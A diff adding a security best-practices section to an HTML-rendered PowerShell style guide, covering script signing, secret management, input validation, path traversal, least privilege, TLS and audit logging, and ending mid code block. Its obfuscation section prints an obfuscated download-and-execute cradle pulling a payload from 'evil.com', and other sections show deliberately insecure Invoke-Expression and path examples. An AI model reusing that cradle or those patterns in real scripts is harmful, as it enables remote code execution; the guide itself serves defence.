@@ -2023,6 +2023,111 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#security-best-practices" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Security Best Practices
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Security Best Practices">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#execution-policy-and-script-signing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Execution Policy and Script Signing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#secure-credential-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Secure Credential Management
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#input-validation-and-injection-prevention" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Input Validation and Injection Prevention
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#secure-file-operations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Secure File Operations
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#least-privilege-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Least Privilege Execution
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Network Security
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#audit-logging" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Audit Logging
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#script-obfuscation-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Script Obfuscation Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#tool-configurations" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -4748,6 +4853,111 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#security-best-practices" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Security Best Practices
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Security Best Practices">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#execution-policy-and-script-signing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Execution Policy and Script Signing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#secure-credential-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Secure Credential Management
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#input-validation-and-injection-prevention" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Input Validation and Injection Prevention
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#secure-file-operations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Secure File Operations
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#least-privilege-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Least Privilege Execution
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Network Security
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#audit-logging" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Audit Logging
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#script-obfuscation-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Script Obfuscation Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#tool-configurations" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -5648,6 +5858,374 @@ cross-platform compatibility.</p>
 <span class="p">}</span>
 <span class="nb">New-ADUser</span> <span class="nv">@userParams</span>
 </code></pre></div>
+<hr />
+<h2 id="security-best-practices">Security Best Practices<a class="headerlink" href="#security-best-practices" title="Permanent link">&para;</a></h2>
+<h3 id="execution-policy-and-script-signing">Execution Policy and Script Signing<a class="headerlink" href="#execution-policy-and-script-signing" title="Permanent link">&para;</a></h3>
+<p>Use proper execution policies and sign scripts:</p>
+<div class="highlight"><pre><span></span><code><span class="c">## Bad - Bypassing execution policy</span>
+<span class="n">PowerShell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="o">-File</span> <span class="n">script</span><span class="p">.</span><span class="n">ps1</span>  <span class="c"># ❌ Security risk!</span>
+
+<span class="c">## Good - Use RemoteSigned or AllSigned</span>
+<span class="nb">Set-ExecutionPolicy</span> <span class="n">-ExecutionPolicy</span> <span class="n">RemoteSigned</span> <span class="n">-Scope</span> <span class="n">CurrentUser</span>
+
+<span class="c">## Good - Sign scripts</span>
+<span class="nv">$cert</span> <span class="p">=</span> <span class="nb">Get-ChildItem</span> <span class="n">Cert</span><span class="p">:\</span><span class="n">CurrentUser</span><span class="p">\</span><span class="n">My</span> <span class="n">-CodeSigningCert</span>
+<span class="nb">Set-AuthenticodeSignature</span> <span class="n">-FilePath</span> <span class="p">.\</span><span class="n">script</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Certificate</span> <span class="nv">$cert</span>
+
+<span class="c">## Good - Verify signature before execution</span>
+<span class="nv">$signature</span> <span class="p">=</span> <span class="nb">Get-AuthenticodeSignature</span> <span class="n">-FilePath</span> <span class="p">.\</span><span class="n">script</span><span class="p">.</span><span class="n">ps1</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$signature</span><span class="p">.</span><span class="n">Status</span> <span class="o">-ne</span> <span class="s1">&#39;Valid&#39;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">throw</span> <span class="s2">&quot;Script signature is invalid!&quot;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p><strong>Key Points</strong>:</p>
+<ul>
+<li>Never use <code>-ExecutionPolicy Bypass</code> in production</li>
+<li>Sign all production scripts</li>
+<li>Use <code>AllSigned</code> policy for maximum security</li>
+<li>Verify signatures before execution</li>
+<li>Store code signing certificates securely</li>
+<li>Use timestamp servers when signing</li>
+</ul>
+<h3 id="secure-credential-management">Secure Credential Management<a class="headerlink" href="#secure-credential-management" title="Permanent link">&para;</a></h3>
+<p>Never hardcode credentials:</p>
+<div class="highlight"><pre><span></span><code><span class="c">## Bad - Hardcoded credentials</span>
+<span class="nv">$username</span> <span class="p">=</span> <span class="s2">&quot;admin&quot;</span>
+<span class="nv">$password</span> <span class="p">=</span> <span class="s2">&quot;Password123&quot;</span>  <span class="c"># ❌ Exposed!</span>
+<span class="nv">$securePassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$password</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+<span class="nv">$credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$securePassword</span><span class="p">)</span>
+
+<span class="c">## Good - Use Get-Credential</span>
+<span class="nv">$credential</span> <span class="p">=</span> <span class="nb">Get-Credential</span> <span class="n">-UserName</span> <span class="s2">&quot;admin&quot;</span> <span class="n">-Message</span> <span class="s2">&quot;Enter password&quot;</span>
+
+<span class="c">## Good - Use Secret Management module</span>
+<span class="nb">Install-Module</span> <span class="n">-Name</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">PowerShell</span><span class="p">.</span><span class="n">SecretManagement</span>
+<span class="nb">Install-Module</span> <span class="n">-Name</span> <span class="n">SecretManagement</span><span class="p">.</span><span class="n">Keychain</span>  <span class="c"># macOS</span>
+<span class="c"># Or: SecretManagement.KeePass, SecretManagement.LastPass</span>
+
+<span class="nb">Set-Secret</span> <span class="n">-Name</span> <span class="s2">&quot;ServiceAccount&quot;</span> <span class="n">-Secret</span> <span class="p">(</span><span class="nb">Get-Credential</span><span class="p">)</span>
+<span class="nv">$credential</span> <span class="p">=</span> <span class="nb">Get-Secret</span> <span class="n">-Name</span> <span class="s2">&quot;ServiceAccount&quot;</span> <span class="n">-AsPlainText</span>
+
+<span class="c">## Good - Azure Key Vault</span>
+<span class="nv">$secret</span> <span class="p">=</span> <span class="nb">Get-AzKeyVaultSecret</span> <span class="n">-VaultName</span> <span class="s2">&quot;MyVault&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DbPassword&quot;</span>
+<span class="nv">$credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">PSCredential</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$secret</span><span class="p">.</span><span class="n">SecretValue</span><span class="p">)</span>
+
+<span class="c">## Good - Never log credentials</span>
+<span class="k">function</span> <span class="nb">Connect-Database</span> <span class="p">{</span>
+    <span class="p">[</span><span class="k">CmdletBinding</span><span class="p">()]</span>
+    <span class="k">param</span><span class="p">(</span>
+        <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Mandatory</span><span class="p">)]</span>
+        <span class="no">[PSCredential]</span><span class="nv">$Credential</span>
+    <span class="p">)</span>
+    <span class="c"># Credential automatically masked in verbose output</span>
+    <span class="nb">Write-Verbose</span> <span class="s2">&quot;Connecting as </span><span class="p">$(</span><span class="nv">$Credential</span><span class="p">.</span><span class="n">UserName</span><span class="p">)</span><span class="s2">&quot;</span>  <span class="c"># ✅ Password not logged</span>
+<span class="p">}</span>
+</code></pre></div>
+<p><strong>Key Points</strong>:</p>
+<ul>
+<li>Never hardcode passwords in scripts</li>
+<li>Use <code>PSCredential</code> objects</li>
+<li>Use Secret Management modules</li>
+<li>Leverage cloud secret stores (Azure Key Vault, AWS Secrets Manager)</li>
+<li>Never log or display <code>SecureString</code> values</li>
+<li>Rotate credentials regularly</li>
+</ul>
+<h3 id="input-validation-and-injection-prevention">Input Validation and Injection Prevention<a class="headerlink" href="#input-validation-and-injection-prevention" title="Permanent link">&para;</a></h3>
+<p>Validate all inputs to prevent injection attacks:</p>
+<div class="highlight"><pre><span></span><code><span class="c">## Bad - No validation (injection risk)</span>
+<span class="k">param</span><span class="p">(</span><span class="nv">$Username</span><span class="p">)</span>
+<span class="nb">Invoke-Expression</span> <span class="s2">&quot;net user $Username /delete&quot;</span>  <span class="c"># ❌ Command injection!</span>
+
+<span class="c">## Good - Validate inputs</span>
+<span class="k">param</span><span class="p">(</span>
+    <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Mandatory</span><span class="p">)]</span>
+    <span class="p">[</span><span class="k">ValidatePattern</span><span class="p">(</span><span class="s1">&#39;^[a-zA-Z0-9_-]+$&#39;</span><span class="p">)]</span>
+    <span class="p">[</span><span class="k">ValidateLength</span><span class="p">(</span><span class="n">1</span><span class="p">,</span> <span class="n">20</span><span class="p">)]</span>
+    <span class="no">[string]</span><span class="nv">$Username</span>
+<span class="p">)</span>
+<span class="nb">Remove-LocalUser</span> <span class="n">-Name</span> <span class="nv">$Username</span>  <span class="c"># ✅ Safe cmdlet</span>
+
+<span class="c">## Good - Use parameter validation</span>
+<span class="k">function</span> <span class="nb">Remove-UserAccount</span> <span class="p">{</span>
+    <span class="k">param</span><span class="p">(</span>
+        <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Mandatory</span><span class="p">)]</span>
+        <span class="p">[</span><span class="k">ValidateSet</span><span class="p">(</span><span class="s1">&#39;Dev&#39;</span><span class="p">,</span> <span class="s1">&#39;Test&#39;</span><span class="p">,</span> <span class="s1">&#39;Prod&#39;</span><span class="p">)]</span>
+        <span class="no">[string]</span><span class="nv">$Environment</span><span class="p">,</span>
+
+        <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Mandatory</span><span class="p">)]</span>
+        <span class="p">[</span><span class="n">ValidateScript</span><span class="p">({</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$_</span> <span class="o">-match</span> <span class="s1">&#39;^[a-zA-Z0-9_-]+$&#39;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$true</span> <span class="p">}</span>
+            <span class="k">else</span> <span class="p">{</span> <span class="k">throw</span> <span class="s2">&quot;Invalid username format&quot;</span> <span class="p">}</span>
+        <span class="p">})]</span>
+        <span class="no">[string]</span><span class="nv">$Username</span>
+    <span class="p">)</span>
+
+    <span class="nb">Remove-LocalUser</span> <span class="n">-Name</span> <span class="nv">$Username</span>
+<span class="p">}</span>
+
+<span class="c">## Good - Avoid Invoke-Expression</span>
+<span class="c">## Bad</span>
+<span class="nv">$command</span> <span class="p">=</span> <span class="s2">&quot;Get-Process -Name $processName&quot;</span>  <span class="c"># User input</span>
+<span class="nb">Invoke-Expression</span> <span class="nv">$command</span>  <span class="c"># ❌ Code injection!</span>
+
+<span class="c">## Good</span>
+<span class="nb">Get-Process</span> <span class="n">-Name</span> <span class="nv">$processName</span>  <span class="c"># ✅ Direct cmdlet call</span>
+</code></pre></div>
+<p><strong>Key Points</strong>:</p>
+<ul>
+<li>Always validate user inputs</li>
+<li>Use <code>ValidatePattern</code>, <code>ValidateSet</code>, <code>ValidateScript</code></li>
+<li>Never use <code>Invoke-Expression</code> with user input</li>
+<li>Use cmdlets instead of string commands</li>
+<li>Sanitize inputs before file operations</li>
+<li>Use parameter binding, not string concatenation</li>
+</ul>
+<h3 id="secure-file-operations">Secure File Operations<a class="headerlink" href="#secure-file-operations" title="Permanent link">&para;</a></h3>
+<p>Prevent path traversal and unauthorized file access:</p>
+<div class="highlight"><pre><span></span><code><span class="c">## Bad - Path traversal vulnerability</span>
+<span class="k">param</span><span class="p">(</span><span class="nv">$FileName</span><span class="p">)</span>
+<span class="nv">$content</span> <span class="p">=</span> <span class="nb">Get-Content</span> <span class="s2">&quot;C:\Data\$FileName&quot;</span>  <span class="c"># ❌ Can access ../../../Windows/System32</span>
+
+<span class="c">## Good - Validate and resolve paths</span>
+<span class="k">param</span><span class="p">(</span>
+    <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Mandatory</span><span class="p">)]</span>
+    <span class="p">[</span><span class="n">ValidateScript</span><span class="p">({</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$_</span> <span class="o">-notmatch</span> <span class="s1">&#39;\.\./&#39;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$true</span> <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span> <span class="k">throw</span> <span class="s2">&quot;Path traversal detected&quot;</span> <span class="p">}</span>
+    <span class="p">})]</span>
+    <span class="no">[string]</span><span class="nv">$FileName</span>
+<span class="p">)</span>
+
+<span class="nv">$basePath</span> <span class="p">=</span> <span class="s2">&quot;C:\Data&quot;</span>
+<span class="nv">$fullPath</span> <span class="p">=</span> <span class="nb">Join-Path</span> <span class="nv">$basePath</span> <span class="nv">$FileName</span> <span class="p">|</span> <span class="nb">Resolve-Path</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">-not</span> <span class="nv">$fullPath</span><span class="p">.</span><span class="n">Path</span><span class="p">.</span><span class="n">StartsWith</span><span class="p">(</span><span class="nv">$basePath</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">throw</span> <span class="s2">&quot;Access denied: path outside allowed directory&quot;</span>
+<span class="p">}</span>
+<span class="nv">$content</span> <span class="p">=</span> <span class="nb">Get-Content</span> <span class="nv">$fullPath</span>
+
+<span class="c">## Good - Set restrictive file permissions</span>
+<span class="nv">$acl</span> <span class="p">=</span> <span class="nb">Get-Acl</span> <span class="s2">&quot;C:\Secrets\config.json&quot;</span>
+<span class="nv">$acl</span><span class="p">.</span><span class="n">SetAccessRuleProtection</span><span class="p">(</span><span class="nv">$true</span><span class="p">,</span> <span class="nv">$false</span><span class="p">)</span>  <span class="c"># Disable inheritance</span>
+<span class="nv">$rule</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">FileSystemAccessRule</span><span class="p">(</span>
+    <span class="s2">&quot;BUILTIN\Administrators&quot;</span><span class="p">,</span> <span class="s2">&quot;FullControl&quot;</span><span class="p">,</span> <span class="s2">&quot;Allow&quot;</span>
+<span class="p">)</span>
+<span class="nv">$acl</span><span class="p">.</span><span class="n">AddAccessRule</span><span class="p">(</span><span class="nv">$rule</span><span class="p">)</span>
+<span class="nb">Set-Acl</span> <span class="s2">&quot;C:\Secrets\config.json&quot;</span> <span class="nv">$acl</span>
+
+<span class="c">## Good - Verify checksums</span>
+<span class="k">function</span> <span class="nb">Get-FileIfValid</span> <span class="p">{</span>
+    <span class="k">param</span><span class="p">(</span>
+        <span class="no">[string]</span><span class="nv">$Url</span><span class="p">,</span>
+        <span class="no">[string]</span><span class="nv">$ExpectedHash</span>
+    <span class="p">)</span>
+
+    <span class="nv">$tempFile</span> <span class="p">=</span> <span class="nb">New-TemporaryFile</span>
+    <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="nv">$Url</span> <span class="n">-OutFile</span> <span class="nv">$tempFile</span>
+
+    <span class="nv">$actualHash</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-FileHash</span> <span class="nv">$tempFile</span> <span class="n">-Algorithm</span> <span class="n">SHA256</span><span class="p">).</span><span class="n">Hash</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$actualHash</span> <span class="o">-ne</span> <span class="nv">$ExpectedHash</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nb">Remove-Item</span> <span class="nv">$tempFile</span>
+        <span class="k">throw</span> <span class="s2">&quot;Hash mismatch! File may be tampered.&quot;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="nv">$tempFile</span>
+<span class="p">}</span>
+</code></pre></div>
+<p><strong>Key Points</strong>:</p>
+<ul>
+<li>Validate file paths to prevent traversal</li>
+<li>Use <code>Resolve-Path</code> and verify resolved paths</li>
+<li>Set appropriate ACLs on sensitive files</li>
+<li>Verify file hashes after download</li>
+<li>Never trust user-provided paths</li>
+<li>Use temporary files for downloads</li>
+</ul>
+<h3 id="least-privilege-execution">Least Privilege Execution<a class="headerlink" href="#least-privilege-execution" title="Permanent link">&para;</a></h3>
+<p>Run scripts with minimal required privileges:</p>
+<div class="highlight"><pre><span></span><code><span class="c">## Bad - Requiring admin for everything</span>
+<span class="c">#Requires -RunAsAdministrator</span>
+<span class="c"># Entire script runs as admin even if not needed</span>
+
+<span class="c">## Good - Check and request elevation only when needed</span>
+<span class="k">function</span> <span class="nb">Install-Application</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">-not</span> <span class="p">(</span><span class="no">[Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]</span><span class="p">::</span><span class="n">GetCurrent</span><span class="p">()).</span><span class="n">IsInRole</span><span class="p">(</span>
+        <span class="no">[Security.Principal.WindowsBuiltInRole]</span><span class="p">::</span><span class="n">Administrator</span>
+    <span class="p">))</span> <span class="p">{</span>
+        <span class="k">throw</span> <span class="s2">&quot;This function requires administrator privileges&quot;</span>
+    <span class="p">}</span>
+
+    <span class="c"># Admin-only operations here</span>
+<span class="p">}</span>
+
+<span class="c">## Good - Use RunAs for specific commands</span>
+<span class="nv">$credential</span> <span class="p">=</span> <span class="nb">Get-Credential</span>
+<span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">localhost</span> <span class="n">-Credential</span> <span class="nv">$credential</span> <span class="n">-ScriptBlock</span> <span class="p">{</span>
+    <span class="nb">Install-WindowsFeature</span> <span class="n">-Name</span> <span class="n">Web-Server</span>
+<span class="p">}</span>
+
+<span class="c">## Good - Separate privileged and non-privileged operations</span>
+<span class="k">function</span> <span class="n">Deploy-Application</span> <span class="p">{</span>
+    <span class="c"># Non-privileged operations</span>
+    <span class="nb">Test-Configuration</span>
+    <span class="n">Build-Application</span>
+
+    <span class="c"># Only elevate for installation</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">Test-IsAdmin</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nb">Install-Service</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nb">Write-Warning</span> <span class="s2">&quot;Run as administrator to install service&quot;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p><strong>Key Points</strong>:</p>
+<ul>
+<li>Don't require admin unless absolutely necessary</li>
+<li>Check for admin rights before privileged operations</li>
+<li>Use <code>Invoke-Command</code> with credentials for remote operations</li>
+<li>Separate privileged and non-privileged code</li>
+<li>Document why elevation is needed</li>
+<li>Use service accounts with minimal permissions</li>
+</ul>
+<h3 id="network-security">Network Security<a class="headerlink" href="#network-security" title="Permanent link">&para;</a></h3>
+<p>Secure network operations:</p>
+<div class="highlight"><pre><span></span><code><span class="c">## Bad - Insecure HTTP</span>
+<span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&quot;http://api.example.com/data&quot;</span>  <span class="c"># ❌ Unencrypted!</span>
+
+<span class="c">## Good - Use HTTPS</span>
+<span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&quot;https://api.example.com/data&quot;</span>
+
+<span class="c">## Good - Verify SSL certificates</span>
+<span class="k">try</span> <span class="p">{</span>
+    <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&quot;https://api.example.com/data&quot;</span> <span class="p">`</span>
+        <span class="n">-ErrorAction</span> <span class="n">Stop</span>  <span class="c"># Will fail on invalid certs</span>
+<span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+    <span class="nb">Write-Error</span> <span class="s2">&quot;SSL certificate validation failed: $_&quot;</span>
+<span class="p">}</span>
+
+<span class="c">## Good - Use authentication headers securely</span>
+<span class="nv">$token</span> <span class="p">=</span> <span class="nb">Get-Secret</span> <span class="n">-Name</span> <span class="s2">&quot;ApiToken&quot;</span> <span class="n">-AsPlainText</span>
+<span class="nv">$headers</span> <span class="p">=</span> <span class="p">@{</span>
+    <span class="s2">&quot;Authorization&quot;</span> <span class="p">=</span> <span class="s2">&quot;Bearer $token&quot;</span>
+<span class="p">}</span>
+<span class="nb">Invoke-RestMethod</span> <span class="n">-Uri</span> <span class="s2">&quot;https://api.example.com/data&quot;</span> <span class="n">-Headers</span> <span class="nv">$headers</span>
+
+<span class="c">## Good - Limit TLS versions</span>
+<span class="no">[Net.ServicePointManager]</span><span class="p">::</span><span class="n">SecurityProtocol</span> <span class="p">=</span> <span class="no">[Net.SecurityProtocolType]</span><span class="p">::</span><span class="n">Tls12</span> <span class="o">-bor</span> <span class="p">`</span>
+    <span class="no">[Net.SecurityProtocolType]</span><span class="p">::</span><span class="n">Tls13</span>
+</code></pre></div>
+<p><strong>Key Points</strong>:</p>
+<ul>
+<li>Always use HTTPS for network requests</li>
+<li>Verify SSL/TLS certificates</li>
+<li>Use TLS 1.2 or higher</li>
+<li>Never disable certificate validation</li>
+<li>Use secure authentication (OAuth, API keys from vaults)</li>
+<li>Implement request timeouts</li>
+</ul>
+<h3 id="audit-logging">Audit Logging<a class="headerlink" href="#audit-logging" title="Permanent link">&para;</a></h3>
+<p>Log security-relevant operations:</p>
+<div class="highlight"><pre><span></span><code><span class="c">## Good - Comprehensive logging</span>
+<span class="k">function</span> <span class="nb">Remove-UserAccount</span> <span class="p">{</span>
+    <span class="p">[</span><span class="k">CmdletBinding</span><span class="p">(</span><span class="n">SupportsShouldProcess</span><span class="p">)]</span>
+    <span class="k">param</span><span class="p">(</span>
+        <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Mandatory</span><span class="p">)]</span>
+        <span class="no">[string]</span><span class="nv">$Username</span>
+    <span class="p">)</span>
+
+    <span class="nv">$auditLog</span> <span class="p">=</span> <span class="s2">&quot;C:\Logs\audit.log&quot;</span>
+    <span class="nv">$timestamp</span> <span class="p">=</span> <span class="nb">Get-Date</span> <span class="n">-Format</span> <span class="s2">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>
+    <span class="nv">$user</span> <span class="p">=</span> <span class="nv">$env:USERNAME</span>
+    <span class="nv">$computer</span> <span class="p">=</span> <span class="nv">$env:COMPUTERNAME</span>
+
+    <span class="nv">$logEntry</span> <span class="p">=</span> <span class="s2">&quot;$timestamp | $computer | $user | Attempting to remove user: $Username&quot;</span>
+    <span class="nb">Add-Content</span> <span class="n">-Path</span> <span class="nv">$auditLog</span> <span class="n">-Value</span> <span class="nv">$logEntry</span>
+
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$PSCmdlet</span><span class="p">.</span><span class="n">ShouldProcess</span><span class="p">(</span><span class="nv">$Username</span><span class="p">,</span> <span class="s2">&quot;Remove user account&quot;</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nb">Remove-LocalUser</span> <span class="n">-Name</span> <span class="nv">$Username</span> <span class="n">-ErrorAction</span> <span class="n">Stop</span>
+            <span class="nv">$logEntry</span> <span class="p">=</span> <span class="s2">&quot;$timestamp | $computer | $user | SUCCESS: Removed user: $Username&quot;</span>
+            <span class="nb">Add-Content</span> <span class="n">-Path</span> <span class="nv">$auditLog</span> <span class="n">-Value</span> <span class="nv">$logEntry</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+        <span class="nv">$logEntry</span> <span class="p">=</span> <span class="s2">&quot;$timestamp | $computer | $user | FAILED: </span><span class="p">$(</span><span class="nv">$_</span><span class="p">.</span><span class="n">Exception</span><span class="p">.</span><span class="n">Message</span><span class="p">)</span><span class="s2">&quot;</span>
+        <span class="nb">Add-Content</span> <span class="n">-Path</span> <span class="nv">$auditLog</span> <span class="n">-Value</span> <span class="nv">$logEntry</span>
+        <span class="k">throw</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c">## Good - Use Windows Event Log</span>
+<span class="k">function</span> <span class="nb">Write-SecurityEvent</span> <span class="p">{</span>
+    <span class="k">param</span><span class="p">(</span>
+        <span class="no">[string]</span><span class="nv">$Message</span><span class="p">,</span>
+        <span class="p">[</span><span class="k">ValidateSet</span><span class="p">(</span><span class="s1">&#39;Information&#39;</span><span class="p">,</span> <span class="s1">&#39;Warning&#39;</span><span class="p">,</span> <span class="s1">&#39;Error&#39;</span><span class="p">)]</span>
+        <span class="no">[string]</span><span class="nv">$Level</span> <span class="p">=</span> <span class="s1">&#39;Information&#39;</span>
+    <span class="p">)</span>
+
+    <span class="nb">Write-EventLog</span> <span class="n">-LogName</span> <span class="n">Application</span> <span class="p">`</span>
+        <span class="n">-Source</span> <span class="s2">&quot;MyApplication&quot;</span> <span class="p">`</span>
+        <span class="n">-EntryType</span> <span class="nv">$Level</span> <span class="p">`</span>
+        <span class="n">-EventId</span> <span class="n">1000</span> <span class="p">`</span>
+        <span class="n">-Message</span> <span class="nv">$Message</span>
+<span class="p">}</span>
+</code></pre></div>
+<p><strong>Key Points</strong>:</p>
+<ul>
+<li>Log all security-relevant operations</li>
+<li>Include timestamps, user, and computer</li>
+<li>Log both successes and failures</li>
+<li>Use Windows Event Log for system-level events</li>
+<li>Protect log files with appropriate ACLs</li>
+<li>Implement log rotation</li>
+<li>Monitor logs for suspicious activity</li>
+</ul>
+<h3 id="script-obfuscation-detection">Script Obfuscation Detection<a class="headerlink" href="#script-obfuscation-detection" title="Permanent link">&para;</a></h3>
+<p>Avoid and detect obfuscated scripts:</p>
+<div class="highlight"><pre><span></span><code><span class="c">## Bad - Obfuscated code (red flag!)</span>
+<span class="nv">$a</span><span class="p">=</span><span class="s1">&#39;I&#39;</span><span class="p">+</span><span class="s1">&#39;E&#39;</span><span class="p">+</span><span class="s1">&#39;X&#39;</span><span class="p">;</span><span class="nv">$b</span><span class="p">=</span><span class="s1">&#39;(Ne&#39;</span><span class="p">+</span><span class="s1">&#39;w-Ob&#39;</span><span class="p">+</span><span class="s1">&#39;ject Ne&#39;</span><span class="p">+</span><span class="s1">&#39;t.WebC&#39;</span><span class="p">+</span><span class="s1">&#39;lient).Dow&#39;</span><span class="p">+</span><span class="s1">&#39;nloadStr&#39;</span><span class="p">+</span><span class="s1">&#39;ing&#39;</span><span class="p">;</span>
+<span class="p">&amp;</span><span class="nv">$a</span><span class="p">(</span><span class="nv">$b</span><span class="p">+</span><span class="s2">&quot;(&#39;http://evil.com/payload.ps1&#39;)&quot;</span><span class="p">)</span>  <span class="c"># ❌ Malicious obfuscation!</span>
+
+<span class="c">## Good - Clear, readable code</span>
+<span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span>
+<span class="nv">$script</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://trusted-site.com/script.ps1&#39;</span><span class="p">)</span>
+<span class="c"># Verify hash before executing</span>
+<span class="nv">$expectedHash</span> <span class="p">=</span> <span class="s2">&quot;ABC123...&quot;</span>
+<span class="nv">$stream</span> <span class="p">=</span> <span class="no">[IO.MemoryStream]</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="no">[Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$script</span><span class="p">))</span>
